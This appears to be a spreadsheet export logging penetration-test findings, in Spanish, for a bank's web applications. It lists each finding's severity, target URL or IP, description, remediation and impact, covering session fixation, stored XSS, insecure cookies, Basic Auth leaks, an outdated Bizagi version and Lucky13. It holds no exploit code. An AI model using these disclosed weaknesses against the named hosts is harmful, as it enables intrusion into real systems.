    <s v="La ausencia de un correcto control de captura y manejo de errores en la aplicación presenta múltiples problemas de seguridad. La problemática más común suele ser la revelación de información interna en mensajes de error, tales como volcados, o información interna de la base de datos, información específica de la tecnología utilizada, volcados de pila, etc._x000a__x000a_Durante las pruebas realizadas, se identifica que la aplicación no gestiona correctamente los errores de Java, llegando a mostrar la pila de debug, así como información muy relevante para el atacante, revelando todas las rutas de funcionalidades del aplicativo"/>
    <s v="Se deben capturar y controlar todas las excepciones producidas en la aplicación, o en los sistemas que las sustentan, evitando proporcionar información útil a un posible atacante, como tecnologías utilizadas por la aplicación, o datos de carácter sensible. Los errores deben ser genéricos, mostrando a muy alto nivel, el problema que origina el mensaje, como por ejemplo “Los datos introducidos no son válidos”, “No se encuentra la ruta indicada”, o “Método HTTP no permitido”."/>
    <s v="Con la información exfiltrada en errores, si no son correctamente gestionados, un atacante puede obtener información interna de la aplicación relativa a su funcionamiento interno, además de información interna sobre las tecnologías utilizadas para sustentar la aplicación en caso de que los errores producidos muestren información acerca del motivo del error. Dada esta información, el atacante podrá realizar ataques especialmente dirigidos, con mayor probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan. En casos en los que el error no muestra información adicional relativa al sistema, aun así, puede crear mala imagen percibida por el usuario, y generar desconfianza sobre el uso de la aplicación."/>
    <s v="1° Fecha: 09/01/2025"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="128"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-675173d186437e5a65e4b57d"/>
    <s v="SC-24-CNMPO-021-AP-003"/>
    <x v="73"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.4"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="La Fijación de Sesión (Session Fixation) es un ataque que permite a un atacante secuestrar una sesión de usuario válida. El ataque explota una limitación en la forma en que la aplicación web gestiona la cookie o identificador de sesión. Al autenticar un usuario, no se asigna un nuevo identificador de sesión, lo que permite usar un identificador existente. _x000a_El ataque consiste en obtener un identificador de sesión válido (por ejemplo, conectándose a la aplicación), inducir a un usuario a autenticarse con ese identificador, y luego secuestrar la sesión validada del usuario con el conocimiento del identificador utilizado. El atacante debe proporcionar un identificador de sesión legítimo de la aplicación web e intentar hacer que el navegador de la víctima lo use._x000a__x000a_Durante las pruebas realizadas se observa que, al iniciar sesión sobre la aplicación, esta no asigna una nueva cookie de sesión, sino que aprovecha la que el usuario posee, y le otorga validez a la misma, de modo que, si un usuario posee una cookie comprometida, la aplicación dará validez a dicha cookie._x000a_Para demostrar la vulnerabilidad, primero se accede al primer frontal no autenticado de la aplicación desde el navegador Google Chrome, simulando un atacante_x000a_"/>
    <s v="Se recomienda que la aplicación no asigne validez de sesión a las cookies utilizadas por el usuario a la hora de realizar el inicio de sesión, sino que, a la hora de iniciar sesión en la aplicación, el servidor de aplicación se encargue de generar un nuevo identificador de sesión válido para el usuario y asignárselo, asegurando que se además se encuentre protegido con los atributos de seguridad de las cookies, como HttpOnly, SameSite, y Secure."/>
    <s v="Un atacante puede engañar a una víctima mediante otros ataques o ingeniería social, para utilizar una cookie de sesión válida de la aplicación. Una vez la víctima inicie sesión en la aplicación, utilizará la cookie proporcionada por el atacante, y se le asignará la sesión del usuario logado. Dado que el atacante posee la cookie utilizada que ahora posee validez, ya que ha sido quien la proporciona en un inicio, podrá acceder a la aplicación web suplantando la sesión del usuario de la víctima que ha iniciado sesión."/>
    <s v="1° Fecha: 09/01/2025"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="129"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-6751746f86437e5a65e4b57e"/>
    <s v="SC-24-CNMPO-021-CO-004"/>
    <x v="74"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Cuando un usuario opera con un aplicativo web, se produce un intercambio de información. Esta información viaja a través de un canal de comunicaciones, al que otros usuarios también pueden acceder y utilizar. Debido a este motivo, la información entre un cliente y el aplicativo web debe enviarse de manera cifrada utilizando el protocolo SSL adecuado, y certificados. _x000a_Si el canal de comunicación no se protege, cualquier usuario con acceso a la red entre el cliente y el servidor de aplicación podrá observar la información transmitida, comprometiendo la confidencialidad, cuyo impacto dependerá en base a la sensibilidad de los datos transmitidos. _x000a_Debido a que se trata de un entorno Preproductivo, se reduce la criticidad a Media, entendiendo que las comunicaciones en Producción se cifrarán._x000a__x000a_Durante las pruebas realizadas, se ha podido observar que las comunicaciones entre el cliente y la aplicación Factoring, http://64.76.89.146:9090/factoring, no se encuentran cifradas, siendo enviadas a través del protocolo HTTP"/>
    <s v="Se recomienda habilitar y forzar las comunicaciones con la aplicación y sus dominios a través del protocolo HTTPS, asegurando el envío de la información a través de un canal cifrado. En caso de que la aplicación se disponga en una red pública, se deberán utilizar certificados firmados por una Autoridad de certificación. En caso de que se disponga en redes internas, se admite el uso de certificados autofirmados, asegurando la correcta cadena de confianza, y que el certificado es válido y no caducará inminentemente."/>
    <s v="El envío de información a través de un canal no cifrado entre el cliente y el servidor de aplicación supondrá el envío de la información en claro. Esto podría permitir a un atacante en la red leer la información transmitida, accediendo potencialmente a información sensible, y exfiltrando la información."/>
    <m/>
    <s v="El ambiente Productivo debe contar con su certificado digital y la protección del WAF Coporativo del Banco"/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="130"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-67517a2b86437e5a65e4b595"/>
    <s v="SC-24-CNMPO-021-CO-005"/>
    <x v="75"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="El identificador de sesión almacenado en la cookie es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript, ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, haciendo uso de las vulnerabilidades de Cross Site Scripting localizadas en la aplicación, se podría usurpar el identificador de sesión del usuario._x000a__x000a_Durante las pruebas de Hacking Ético se observa que la Cookie de autenticación en la plataforma, “JESSSIONID” no dispone del atributo HttpOnly, siendo accesible con JavaScript, y susceptible a ataques XSS, o el acceso por medio de plugins maliciosos"/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;HttpOnly&quot;, evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger."/>
    <s v="La ausencia del atributo HttpOnly permite el acceso a las cookies a través de JavaScript, permitiendo el robo de las mismas a través de ataques XSS (Cross-Site Scripting), o posible extensiones de navegador vulnerables. _x000a_El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 09/01/2025"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="131"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-67517a9486437e5a65e4b5a3"/>
    <s v="SC-24-CNMPO-021-CO-006"/>
    <x v="76"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="4.5999999999999996"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Las aplicaciones implementadas en JBoss Seam permiten la interacción de los usuarios con sus servicios a través de las diferentes funcionalidades expuestas en los endpoints .seam. _x000a_La estructura de estos servicios .seam está definida parcialmente en su fichero análogo .xhtml, pero normalmente no es necesario el acceso a los mismos para la ejecución de las funcionalidades. _x000a_El acceso a los ficheros .xhtml por parte de un actor malintencionado, podría proporcionar información respecto a los componentes a4j utilizados, las diferentes acciones definidas en el servicio, y el comportamiento general del mismo, facilitando la ejecución de ataques dirigidos. Así mismo, como dichos ficheros no son necesarios para la ejecución, es habitual no implementar un control de acceso sobre los mismos, por lo que un atacante no autenticado podría obtener información detallada respecto a servicios autenticados._x000a__x000a_Durante las pruebas de Hacking Ético se observa la posibilidad de acceso a los ficheros .xhtml de JBoss Seam"/>
    <s v="Se recomienda restringir el acceso a los diferentes ficheros .xhtml de la plataforma, delegando la ejecución de los servicios a través de los ficheros .seam. En caso de ser imprescindible el acceso a algún fichero .xhtml, este deberá implementar un control de accesos robusto en el que valide la sesión del usuario antes de proveer algún tipo de información."/>
    <s v="El acceso a los ficheros .xhtml por parte de un actor malintencionado, podría proporcionar información respecto a los componentes a4j utilizados, las diferentes acciones definidas en el servicio, y el comportamiento general del mismo, facilitando la ejecución de ataques dirigidos. Así mismo, como dichos ficheros no son necesarios para la ejecución, es habitual no implementar un control de acceso sobre los mismos, por lo que un atacante no autenticado podría obtener información detallada respecto a servicios autenticados, y enumerar los servicios presentes en el aplicativo."/>
    <s v="1° Fecha: 09/01/2025"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="132"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-67517ad686437e5a65e4b5a4"/>
    <s v="SC-24-CNMPO-021-AP-007"/>
    <x v="77"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-29T00:00:00"/>
    <s v="Las aplicaciones en ocasiones contienen funcionalidades de subida de ficheros para cumplir con tareas relacionadas con su lógica de negocio, como la carga de datos a través de ficheros, el adjunto de documentación, o el envío y compartición de ficheros. Estas funcionalidades son puntos potenciales de subida de malware e infección de la aplicación, por lo que deben implementar exhaustivos controles del tamaño, contenido, y extensión del fichero subido. _x000a__x000a_La ausencia de estos controles podría permitir a un atacante subir malware, o como en este caso, ficheros Office con Macros, que, en caso de ser abiertos, podrían conllevar la ejecución de una carga maliciosa que comprometa al sistema o usuario que ha abierto el fichero._x000a__x000a_Durante las pruebas de Hacking Ético se observa la posibilidad de subir al aplicativo ficheros .XLS (Excel) con Macros adjuntas, incluyendo líneas y funciones que podrían implicar la ejecución de código ante una apertura exitosa"/>
    <s v="La subida al aplicativo de ficheros Office con Macros adjuntas, podría implicar la posterior ejecución de las mismas, bien por un usuario que acceda al aplicativo, o por el sistema al realizar la lectura del fichero. Estas macros pueden contener ejecución de programas maliciosos, o de comandos en el sistema, pudiendo llevar al compromiso de la integridad del servidor de aplicación."/>
    <s v="Se recomienda implementar validaciones y análisis del contenido de los ficheros subidos a la aplicación, impidiendo la subida de ficheros con contenido malicioso, como Macros para ficheros Office, Entidades para ficheros XML, o firmas de software malicioso. Este análisis puede ser previo a la subida al aplicativo, mediante el uso de una sandbox intermedia donde se envíe el archivo, sea analizado, y posteriormente subido al aplicativo, o puede ser inmediatamente posterior a la subida, siendo este subido sobre un directorio que sea constantemente analizado por un software antivirus, y elimine el fichero ante la detección de contenido malicioso."/>
    <s v="1° Fecha: 09/01/2025"/>
    <s v="Certificada"/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="133"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-67517c0f86437e5a65e4b5a5"/>
    <s v="SC-24-CNMPO-021-CO-008"/>
    <x v="51"/>
    <m/>
    <x v="0"/>
    <s v="Low"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-04-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de la misma, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar scripts dentro de la página._x000a__x000a_Durante el ejercicio de Hacking Ético se ha identifica el uso de los atributos ‘unsafe-inline’ y ‘unsafe-eval’ sobre la directiva “script-src” de la cabecera Content-Security-Policy, admitiendo la inserción, reflejo, e interpretación de código de código JavaScript y con ello, eliminando las mitigaciones contra posibles vulnerabilidades Cross-Site Scripting:"/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos. Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera HTTP Content-Security-Policy. _x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran parte de las capacidades de seguridad de la cabecera. _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_· Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: · &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt;"/>
    <s v="La ausencia o incorrección de la cabecera Content Security Policy podría permitir a un atacante realizar ataques XSS en el caso de que la aplicación tuviera alguna vulnerabilidad, o cargar recursos maliciosos externos. El Cross-Site Scripting o XSS es una técnica que permite a un atacante cargar código JavaScript en el navegador de la víctima."/>
    <m/>
    <s v="Se esta revisando con el equipo del WAF la implementación"/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="134"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-67517c5486437e5a65e4b5a6"/>
    <s v="SC-24-CNMPO-021-CO-009"/>
    <x v="78"/>
    <m/>
    <x v="0"/>
    <s v="Low"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-04-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar, poniendo en riesgo el identificador de sesión del usuario cuando se encuentra en tránsito._x000a__x000a_Durante las pruebas de Hacking Ético se observa que la Cookie de autenticación en la plataforma, “JESSSIONID” no dispone del atributo Secure, admitiendo su transmisión a través de medios no cifrados, y en dicho caso, facilitando su usurpación"/>
    <s v="Se recomienda proteger los identificadores de sesión almacenados a través de las cookies mediante el atributo de seguridad &quot;Secure&quot;. De esta manera se evita que el identificador de sesión pueda ser transmitido por canales no cifrados. _x000a_La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <s v="El robo de cookies intervinientes con la generación de la sesión de un usuario podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 09/01/2025"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="135"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-67517e5d86437e5a65e4b5cc"/>
    <s v="SC-24-CNMPO-021-CO-010"/>
    <x v="79"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.3"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-04-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-29T00:00:00"/>
    <s v="Se ha detectado que la función &quot;Autocompletar&quot; se encuentra habilitada en varios de los formularios de la aplicación. Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la aplicación, facilitando la recuperación de datos de carácter sensible, o de utilidad para la operación sobre la plataforma._x000a__x000a_Durante las pruebas realizadas, se identifica que el formulario de inicio de sesión posee varios campos sin el atributo “autocompletar=off”, habilitando el cacheo de datos introducidos previamente, y mostrándolos al interactuar con dicho campo, recordando datos de carácter sensible como números de documentos de identidad"/>
    <s v="Se recomienda añadir la directiva &quot;autocomplete=off&quot; en todos los campos que contengan información sensible que vaya a ser enviada a la aplicación para evitar que esta información sea cacheada y posteriormente recuperada por un tercero con acceso al navegador del usuario."/>
    <s v="Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría a usuarios y atacantes posteriores revisar los datos introducidos en los diferentes formularios de la aplicación, comprometiendo la confidencialidad de los mismos. Estos datos son de carácter sensible, y algunos de ellos, como el correo electrónico, podría utilizarse en posteriores ataques de ingeniería social."/>
    <s v="1° Fecha: 09/01/2025"/>
    <s v="Certificada"/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="136"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-6762eb6f0c973c5860ee4749"/>
    <s v="SCO-24-CNMPO-020-VE-001"/>
    <x v="7"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.5999999999999996"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/O_x000a_riginacionPROD"/>
    <m/>
    <m/>
    <d v="2024-12-12T00:00:00"/>
    <n v="558"/>
    <d v="2025-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que el sistema remoto está ejecutando una_x000a_versión del software de Bizagi BPM que se encuentra desactualizada (versión 11.2.5.0811). _x000a_"/>
    <s v="Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada se recomienda instalar los parches de seguridad específicos que pongan en riesgo la seguridad del sistema."/>
    <s v="Un atacante podría identificar el software utilizado por la aplicación con la finalidad de explotar alguna vulnerabilidad conocida para tomar el control del sistema."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="137"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-6788fa000c973c5860eff565"/>
    <s v="CO-24-CNMPO-022-CO-001"/>
    <x v="80"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="6.9"/>
    <m/>
    <m/>
    <s v="https://sccfc22ga.cocf.pre.corp"/>
    <m/>
    <m/>
    <d v="2025-01-15T00:00:00"/>
    <n v="524"/>
    <d v="2025-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-03-20T00:00:00"/>
    <s v="Durante las pruebas realizadas contra la API otorgada para esta revisión, se ha podido determinar que es posible inyectar código JavaScript en diversos campos de texto que serán remitidos por correo electrónico, los cuales acabarán ejecutándose por parte del explorador utilizado al visualizar el correo desencadenando la vulnerabilidad de Cross-site Scripting (XSS) almacenado. Además, es posible incluir en dichos campos URLs maliciosas, que podrían ser utilizadas para engañar al usuario._x000a__x000a_Es importante tener en cuenta que tanto el cambio de correo electrónico como la inserción de una URL maliciosa (en este caso remitida como clave provisional), podrían conllevar a una vulnerabilidad adicional de Spear Phishing. Ya que no es el objetivo de este ejercicio, y que esto es posible debido a una mala validación de los datos de entrada, se comenta esta vulnerabilidad como posibilidad adicional dentro del XSS almacenado."/>
    <s v="Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por los usuarios, de forma que se valide adecuadamente la información transmitida a través de los mismos. Existen dos estrategias generales para implantar este filtro:_x000a_• Filtrado de lista blanca: Se valida la información recibida en función de la información esperada._x000a_• Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código JavaScript. Esta lista de caracteres podría ser “’”, “&lt;”, “&gt;”, “)”, “(“, “”” y la cadena “script”. De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga una complejidad alta, se recomienda utilizar una estrategia basada en listas negras. Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que el navegador del usuario interprete código JavaScript debido a una inyección de código, una posibilidad sería renderizar caracteres especiales como HTML Entities:_x000a_• (&quot;) sería &amp;quot_x000a_• (') sería &amp;apos_x000a_• (&lt;) sería &amp;lt_x000a_• (&gt;) sería &amp;gt"/>
    <s v="Mediante la inyección de código que permite la presente vulnerabilidad, un atacante podría generar direcciones URLs, o formularios HTML, utilizando código malintencionado incrustado en los valores de los parámetros, con la finalidad de realizar alguna de las siguientes acciones:_x000a_• Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario que, normalmente, se encuentra almacenado a través de una cookie._x000a_• Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible._x000a_• Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el sistema de la víctima._x000a__x000a_Ejecución de acciones de forma &quot;transparente&quot; para el usuario: Interactuar con la aplicación y realizar acciones sin el conocimiento del usuario."/>
    <m/>
    <m/>
    <s v="Cesar Augusto Garzón Puentes"/>
  </r>
  <r>
    <n v="138"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <s v="MAN-6788fa4d0c973c5860eff566"/>
    <s v="CO-24-CNMPO-022-CO-002"/>
    <x v="81"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="6.2"/>
    <m/>
    <m/>
    <s v="https://sccfc22ga.cocf.pre.corp"/>
    <m/>
    <m/>
    <d v="2025-01-15T00:00:00"/>
    <n v="524"/>
    <d v="2025-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-03-20T00:00:00"/>
    <s v="Durante las pruebas realizadas, se ha observado que la API auditada realiza una petición para la generación del Payload para el Enrollment con Autenticación Básica en una llamada con el método GET, permitiendo la filtración de las credenciales del usuario utilizado._x000a_La API revisada consta de una primera petición llamada “createPayload”, petición necesaria para generar un payload (un código de autorización según se ha podido comprobar, que hace de token) que será utilizado como medio de autenticación para la petición posterior de Enrollment llamada “Enrolamiento”._x000a__x000a_Esta petición realizada por la API se puede paralizar gracias a un proxy intermedio, permitiendo su visualización y descubriendo del uso del método inseguro de envío de credenciales Basic Auth en la variable Authorization._x000a_Si se decodifica este identificador en base64, se pueden obtener las credenciales en texto plano del usuario utilizadas"/>
    <s v="De manera general se recomienda no utilizar el método de &quot;Autenticación Básica&quot; en el proceso de autenticación de los usuarios. _x000a_Utilizar sistemas de autenticación robustos, que autentiquen al usuario mediante identificadores generados de manera dinámica por un algoritmo de hash robusto. Además, estos identificadores no deben contener las credenciales de los usuarios o partes de estas."/>
    <s v="Un atacante que tuviese acceso a registros (log) de comunicación de red HTTP (ataques de intermediario: MitM) o a los logs de ciertos sistemas intermedios, por ejemplo proxies y/o servidor de BackEnd, podría acceder a los datos de estos registros y decodificar las credenciales transmitidas en texto claro. _x000a_Por otro lado, este método de autenticación no es compatible con el uso de medidas de protección específicas para evitar ataques de fuerza bruta."/>
    <m/>
    <m/>
    <s v="Cesar Augusto Garzón Puentes"/>
  </r>
  <r>
    <n v="139"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CRM Hubspot"/>
    <s v="MAN-67b8555cdd7b5726115d2b28"/>
    <s v="SC-25-CNMPO-001-AP-001"/>
    <x v="82"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="4.1"/>
    <m/>
    <m/>
    <s v="https://api.hubapi.com"/>
    <m/>
    <m/>
    <d v="2025-02-18T00:00:00"/>
    <n v="490"/>
    <d v="2025-05-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación debe garantizar que únicamente se puedan ingresar datos coherentes para la lógica de negocio en la propia aplicación. Así mismo, también se ha de realizar una validación de este tipo de lógica directamente en el lado del servidor para garantizar que un usuario malintencionado no haga uso de proxies intermedios para manipular estos datos para evadir las restricciones impuestas en el front-end, cuando esta información se encuentra en tránsito._x000a__x000a_En este caso específico, ha sido posible modificar el campo createdate y añadir payloads XSS potencialmente ejecutables debido a la ausencia de validación de los campos. No se ha podido verificar la ejecución de los payloads XSS, ya que se trata de una API. Sin embargo, si esta vulnerabilidad se llegara a reflejar en una interfaz web, la criticidad de la vulnerabilidad podría aumentar significativamente, elevándose a un nivel alto._x000a__x000a_Durante las pruebas realizadas sobre la aplicación se ha podido comprobar que no se están aplicando las validaciones de la lógica de negocio pertinentes a la hora de añadir y modificar campos en la aplicacion."/>
    <s v="Tanto el front-end como el back-end de la aplicación deben verificar y validar que los datos introducidos por los usuarios cumplen con la lógica de negocio de cada funcionalidad de la aplicación y aplicar las restricciones pertinentes dependiendo de los tipos de datos que espera la aplicación."/>
    <s v="Un atacante puede hacer que una funcionalidad de la aplicación puede alterar su funcionamiento o forzar a que se comporte de una manera inesperada. De esta manera es posible evadir ciertas restricciones de lógica de negocio impuestas por la aplicación, o sobrepasar los límites impuestos por la misma."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="140"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="CRM Hubspot"/>
    <s v="MAN-67b8558edd7b5726115d2b29"/>
    <s v="SC-25-CNMPO-001-CO-002"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <s v="CVE-2013-0169"/>
    <m/>
    <s v="https://api.hubapi.com"/>
    <m/>
    <m/>
    <d v="2025-02-18T00:00:00"/>
    <n v="490"/>
    <d v="2025-06-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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Chaining) son potencialmente vulnerables a este tipo ataques._x000a__x000a_Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a__x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a__x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace:_x000a_• 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s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="141"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="QA-WAS-da020af7-8438-4ec1-9108-caccf52e0842"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/assets/img/test/"/>
    <m/>
    <m/>
    <d v="2022-04-01T00:00:00"/>
    <n v="1544"/>
    <d v="2022-06-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
